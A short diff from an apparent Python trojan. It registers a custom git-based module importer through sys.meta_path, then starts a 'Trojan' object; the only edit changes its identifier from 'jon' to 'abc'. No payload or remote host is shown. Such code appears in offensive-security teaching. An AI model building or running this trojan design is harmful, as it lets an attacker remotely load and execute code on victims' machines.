@@ -80,6 +80,6 @@ class GitImport:
     
 if __name__ == '__main__':
     sys.meta_path.append(GitImport())
-    trojan = Trojan('jon')
+    trojan = Trojan('abc')
     print(trojan)
     trojan.run()
